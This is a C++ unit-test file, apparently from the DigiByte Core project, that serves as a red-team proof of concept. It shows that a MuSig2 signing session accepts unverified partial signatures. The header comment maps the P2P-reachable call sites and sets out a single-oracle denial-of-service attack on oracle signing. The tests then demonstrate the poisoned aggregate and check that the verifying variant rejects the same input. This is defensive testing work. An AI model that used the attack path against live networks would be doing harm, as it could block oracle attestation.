// Copyright (c) 2026 The DigiByte Core developers
// Distributed under the MIT software license, see the accompanying
// file COPYING or http://www.opensource.org/licenses/mit-license.php.

/**
 * RH-55: MuSig2 partial-sig aggregation accepts unverified scalars
 *        (Wave-3 adversarial PoC — cryptographic attack)
 *
 * Target: src/oracle/musig2_session.cpp::AddPartialSignature (:344-368)
 *         called from:
 *           - src/oracle/bundle_manager.cpp::ProcessRemoteMusigPartialSig
 *             (:1779, P2P-reachable via net_processing.cpp:6194 ORACLEMUSIGPARTIALSIG)
 *           - src/oracle/musig2_orchestrator.cpp::AddPartialSigForEpoch (:96)
 *           - src/oracle/musig2_session_manager.cpp::OnPartialSigReceived (:67)
 *           - src/oracle/musig2_oracle_participation.cpp::OnOracleMusigPartialSig (:158)
 *
 * Pre-patch behavior:
 *   `AddPartialSignature` performs four checks before accepting a partial sig:
 *     (a) state == SIGNING
 *     (b) secp256k1 internal magic bytes == {0xeb, 0xfb, 0x1a, 0x32}
 *     (c) not a duplicate oracle_id
 *     (d) oracle_id is in m_pubnonces (participant set)
 *   It does NOT call secp256k1_musig_partial_sig_verify against the
 *   session's keyagg_cache + aggregate nonce + message. The sibling
 *   method `AddPartialSignatureVerified` DOES perform that check, but
 *   of the six call sites only one (signing_orchestrator.cpp:136) uses
 *   the verifying variant. Every P2P-reachable path lands in the
 *   unverified variant.
 *
 *   `secp256k1_musig_partial_sig_parse` only validates the 32-byte
 *   scalar is in range [0, n) and then sets the magic bytes itself, so
 *   ANY in-range scalar submitted by a malicious oracle produces a
 *   parsed-looking partial_sig that survives (a)-(d).
 *
 *   Subsequent `AggregateSignature` then calls
 *   `secp256k1_musig_partial_sig_agg`, which sums contributions without
 *   verifying them, producing a 64-byte scalar pair that does NOT
 *   verify as a BIP-340 Schnorr signature under the aggregate pubkey.
 *
 * Why this is novel (not C1-C4, H1-H8, M1-M5, W1-W2):
 *   - C1-C4 are DD validation / mainnet short-circuit / ERR, not MuSig2.
 *   - H1-H8 and M1-M5 do not touch partial-sig ingestion.
 *   - M2 notes MuSig2SessionManager is unused, but the live path
 *     OracleBundleManager::ProcessRemoteMusigPartialSig IS wired from
 *     net_processing.cpp:6194 and is the vulnerable entry point here.
 *   - Existing musig2_session_tests.cpp::test_session_rejects_invalid_partial_sig_content
 *     tried to exercise this but used wrong magic bytes (0xeb,0xfb,0xce,0x86)
 *     in its hand-crafted garbage, so the test rejects on magic mismatch
 *     (defense-in-depth layer) rather than on the missing verify. With
 *     CORRECT magic + a parsed 32-byte scalar, the bug is reachable.
 *
 * Attack model (network-level DoS on oracle signing):
 *   - A single malicious / compromised oracle among the 9-of-17 quorum
 *     sends an OracleMusigPartialSigMsg carrying 32 random bytes (or
 *     any in-range scalar) as `partial_sig`.
 *   - The outer auth signature at bundle_manager.cpp:1748 only proves
 *     the MESSAGE came from the claimed oracle_id (who has the real
 *     oracle signing key) — it says nothing about whether the inner
 *     MuSig2 partial sig is valid.
 *   - The garbage passes parse + AddPartialSignature. When the quorum
 *     threshold is reached, the eager aggregation at bundle_manager.cpp
 *     :1789-1796 runs and produces a 64-byte aggregate that does not
 *     verify as a Schnorr signature under the aggregate pubkey.
 *   - The miner ships the bundle into the coinbase; validators reject
 *     the block's oracle Schnorr. Rinse and repeat every epoch.
 *
 * Impact: HIGH (network DoS on oracle attestation)
 *   Any one compromised oracle can indefinitely block Phase-3 oracle
 *   signing, preventing DD mints/redemptions, without needing to reach
 *   any threshold — one malicious participant is sufficient per round.
 *
 * Fix direction (NOT applied in this commit — defender wave will decide):
 *   Switch the five unverified call sites to `AddPartialSignatureVerified`
 *   using the oracle's pubkey from Params().GetOracleNode(). The sixth
 *   site (signing_orchestrator.cpp:136) already does this correctly and
 *   can serve as a template.
 *
 * This test asserts the PRE-FIX invariant: the session accepts garbage
 * partial sigs with correct magic, and the resulting aggregate does NOT
 * verify against the aggregate pubkey. When the fix is applied, the
 * two BOOST_CHECK_MESSAGE lines marked "URGENT-STOP-CONDITION" flip
 * from success (bug demonstrated) to failure (test must be rewritten
 * against the verifying API).
 */

#include <boost/test/unit_test.hpp>

#include <key.h>
#include <random.h>
#include <test/util/setup_common.h>
#include <oracle/musig2_session.h>

#include <secp256k1.h>
#include <secp256k1_extrakeys.h>
#include <secp256k1_musig.h>
#include <secp256k1_schnorrsig.h>

#include <cstring>
#include <vector>

BOOST_FIXTURE_TEST_SUITE(rh55_musig2_partial_sig_unverified_aggregation_tests, BasicTestingSetup)

namespace {

bool MakeRandomKeypair(secp256k1_context* ctx,
                       unsigned char seckey[32],
                       secp256k1_keypair* keypair,
                       secp256k1_pubkey* pubkey)
{
    GetStrongRandBytes(Span{seckey, 32});
    if (!secp256k1_keypair_create(ctx, keypair, seckey)) return false;
    if (!secp256k1_keypair_pub(ctx, pubkey, keypair)) return false;
    return true;
}

CKey MakeCKey(const unsigned char seckey[32])
{
    CKey key;
    key.Set(seckey, seckey + 32, true);
    return key;
}

} // namespace

// ============================================================================
// rh55_garbage_partial_sig_poisons_aggregate
//
// Honest 2-of-2 setup, signer 1 is the malicious oracle. Demonstrates that
// AddPartialSignature accepts a random 32-byte scalar as signer 1's partial
// sig, the session proceeds to AggregateSignature which produces a 64-byte
// output, and that output FAILS Schnorr verification — poisoned aggregate.
// ============================================================================
BOOST_AUTO_TEST_CASE(rh55_garbage_partial_sig_poisons_aggregate)
{
    secp256k1_context* ctx = secp256k1_context_create(SECP256K1_CONTEXT_NONE);
    BOOST_REQUIRE(ctx != nullptr);

    constexpr size_t N = 2;
    constexpr uint8_t MIN_SIGNERS = 2;
    constexpr int32_t EPOCH = 31415;

    // 1. Generate N keypairs and aggregate them.
    unsigned char seckeys[N][32];
    secp256k1_keypair keypairs[N];
    secp256k1_pubkey pubkeys[N];
    for (size_t i = 0; i < N; ++i) {
        BOOST_REQUIRE(MakeRandomKeypair(ctx, seckeys[i], &keypairs[i], &pubkeys[i]));
    }
    std::vector<const secp256k1_pubkey*> pubkey_ptrs(N);
    for (size_t i = 0; i < N; ++i) pubkey_ptrs[i] = &pubkeys[i];

    secp256k1_xonly_pubkey agg_pk;
    secp256k1_musig_keyagg_cache cache;
    BOOST_REQUIRE(secp256k1_musig_pubkey_agg(ctx, &agg_pk, &cache,
                                             pubkey_ptrs.data(), N));

    // 2. Start an honest signing session and produce both pubnonces.
    MuSig2SigningSession session(EPOCH, MIN_SIGNERS);
    CKey ckey0 = MakeCKey(seckeys[0]);
    secp256k1_musig_pubnonce pubnonce0;
    BOOST_REQUIRE(session.GenerateNonce(0, ckey0, pubkeys[0], cache, pubnonce0));

    secp256k1_musig_secnonce secnonce1;
    secp256k1_musig_pubnonce  pubnonce1;
    unsigned char rand1[32];
    GetStrongRandBytes(Span{rand1, 32});
    BOOST_REQUIRE(secp256k1_musig_nonce_gen(ctx, &secnonce1, &pubnonce1,
                                            rand1, seckeys[1], &pubkeys[1],
                                            nullptr, &cache, nullptr));

    BOOST_REQUIRE(session.AddPubnonce(0, pubnonce0));
    BOOST_REQUIRE(session.AddPubnonce(1, pubnonce1));
    BOOST_REQUIRE(session.HasEnoughNonces());

    // 3. Aggregate nonces with a concrete message — now state == SIGNING.
    unsigned char msg[32];
    GetStrongRandBytes(Span{msg, 32});
    BOOST_REQUIRE(session.AggregateNonces(msg));
    BOOST_REQUIRE(session.GetState() == MuSig2SessionState::SIGNING);

    // 4. Honest signer 0 contributes a real partial sig.
    secp256k1_musig_partial_sig psig0;
    BOOST_REQUIRE(session.CreatePartialSignature(0, ckey0, psig0));
    BOOST_REQUIRE(session.AddPartialSignature(0, psig0));

    // 5. Malicious signer 1 crafts a garbage partial sig. We reach this
    //    through the P2P path: 32-byte buffer → secp256k1_musig_partial_sig_parse
    //    (range check + magic stamping) → AddPartialSignature.
    secp256k1_musig_partial_sig garbage_psig;
    unsigned char garbage_bytes[32];
    // Pick a scalar that is guaranteed in [0, n): random ≥ n is astronomically
    // unlikely but we force a small scalar to make the test deterministic.
    std::memset(garbage_bytes, 0, 32);
    garbage_bytes[31] = 0x42; // small non-zero scalar

    int parse_ok = secp256k1_musig_partial_sig_parse(ctx, &garbage_psig, garbage_bytes);
    BOOST_REQUIRE(parse_ok == 1);

    // This is the heart of the exploit: the unverified AddPartialSignature
    // MUST reject this garbage, but pre-patch it ACCEPTS it.
    bool accepted = session.AddPartialSignature(1, garbage_psig);

    BOOST_CHECK_MESSAGE(accepted,
        "URGENT-STOP-CONDITION rh55: expected UNVERIFIED AddPartialSignature "
        "to accept a parsed-but-invalid partial sig (pre-fix bug signature). "
        "If this line flips to rejected, the fix to switch callers to "
        "AddPartialSignatureVerified may already be in place — update the "
        "test to use the new API.");

    // 6. Aggregation must either succeed (producing a non-verifying sig) or
    //    fail. Either way the session is bricked — concrete DoS.
    std::vector<unsigned char> sig64;
    bool agg_ok = session.AggregateSignature(sig64);

    if (agg_ok) {
        BOOST_REQUIRE_EQUAL(sig64.size(), 64u);
        int verify = secp256k1_schnorrsig_verify(ctx, sig64.data(), msg, 32, &agg_pk);
        BOOST_CHECK_MESSAGE(verify == 0,
            "URGENT-STOP-CONDITION rh55: aggregate produced from a garbage "
            "partial sig unexpectedly verified under the aggregate pubkey — "
            "this would be a FORGERY, not just a DoS. Escalate to CRITICAL.");
        BOOST_TEST_MESSAGE("rh55 CONFIRMED: aggregate produced but does NOT "
                           "verify — DoS bricks the epoch's oracle signing");
    } else {
        // Also a valid DoS outcome: AggregateSignature refuses and the
        // session transitions to FAILED, making the epoch unrecoverable
        // without restarting from round 1.
        BOOST_CHECK(session.GetState() == MuSig2SessionState::FAILED);
        BOOST_TEST_MESSAGE("rh55 CONFIRMED: AggregateSignature refused the "
                           "poisoned set, session FAILED — DoS confirmed");
    }

    // Sanity: clean up scratch nonce.
    std::memset(&secnonce1, 0, sizeof(secnonce1));
    secp256k1_context_destroy(ctx);
}

// ============================================================================
// rh55_verifying_variant_rejects_garbage
//
// Confirms the defender fix target exists and works: AddPartialSignatureVerified
// rejects the same garbage the unverified path accepts. This is the invariant
// a defender patch must make true for AddPartialSignature as well (by routing
// the P2P paths through the verifying call).
// ============================================================================
BOOST_AUTO_TEST_CASE(rh55_verifying_variant_rejects_same_garbage)
{
    secp256k1_context* ctx = secp256k1_context_create(SECP256K1_CONTEXT_NONE);
    BOOST_REQUIRE(ctx != nullptr);

    constexpr size_t N = 2;
    constexpr uint8_t MIN_SIGNERS = 2;
    constexpr int32_t EPOCH = 31416;

    unsigned char seckeys[N][32];
    secp256k1_keypair keypairs[N];
    secp256k1_pubkey  pubkeys[N];
    for (size_t i = 0; i < N; ++i) {
        BOOST_REQUIRE(MakeRandomKeypair(ctx, seckeys[i], &keypairs[i], &pubkeys[i]));
    }
    std::vector<const secp256k1_pubkey*> pubkey_ptrs(N);
    for (size_t i = 0; i < N; ++i) pubkey_ptrs[i] = &pubkeys[i];

    secp256k1_xonly_pubkey agg_pk;
    secp256k1_musig_keyagg_cache cache;
    BOOST_REQUIRE(secp256k1_musig_pubkey_agg(ctx, &agg_pk, &cache,
                                             pubkey_ptrs.data(), N));

    MuSig2SigningSession session(EPOCH, MIN_SIGNERS);
    CKey ckey0 = MakeCKey(seckeys[0]);
    secp256k1_musig_pubnonce pubnonce0;
    BOOST_REQUIRE(session.GenerateNonce(0, ckey0, pubkeys[0], cache, pubnonce0));

    secp256k1_musig_secnonce secnonce1;
    secp256k1_musig_pubnonce  pubnonce1;
    unsigned char rand1[32];
    GetStrongRandBytes(Span{rand1, 32});
    BOOST_REQUIRE(secp256k1_musig_nonce_gen(ctx, &secnonce1, &pubnonce1,
                                            rand1, seckeys[1], &pubkeys[1],
                                            nullptr, &cache, nullptr));

    BOOST_REQUIRE(session.AddPubnonce(0, pubnonce0));
    BOOST_REQUIRE(session.AddPubnonce(1, pubnonce1));

    unsigned char msg[32];
    GetStrongRandBytes(Span{msg, 32});
    BOOST_REQUIRE(session.AggregateNonces(msg));

    secp256k1_musig_partial_sig psig0;
    BOOST_REQUIRE(session.CreatePartialSignature(0, ckey0, psig0));
    BOOST_REQUIRE(session.AddPartialSignature(0, psig0));

    // Same garbage as previous test — this time routed through the verifying API.
    secp256k1_musig_partial_sig garbage_psig;
    unsigned char garbage_bytes[32];
    std::memset(garbage_bytes, 0, 32);
    garbage_bytes[31] = 0x42;
    BOOST_REQUIRE(secp256k1_musig_partial_sig_parse(ctx, &garbage_psig, garbage_bytes));

    bool verified_ok = session.AddPartialSignatureVerified(1, garbage_psig, pubkeys[1]);
    BOOST_CHECK_MESSAGE(!verified_ok,
        "rh55 defender-path sanity: AddPartialSignatureVerified must reject the "
        "same garbage the unverified variant accepts. If this assertion fires, "
        "the verifying path is also broken and the fix target is moot.");

    std::memset(&secnonce1, 0, sizeof(secnonce1));
    secp256k1_context_destroy(ctx);
}

BOOST_AUTO_TEST_SUITE_END()
